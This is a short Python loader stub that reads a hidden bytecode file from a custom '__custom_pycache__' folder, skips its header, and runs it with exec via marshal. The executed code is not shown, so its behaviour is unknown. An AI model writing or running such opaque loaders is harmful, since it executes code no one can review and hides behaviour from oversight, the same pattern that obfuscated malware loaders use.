
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BinaryToImage_37c9ed3145a24fac80566acfce717994.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
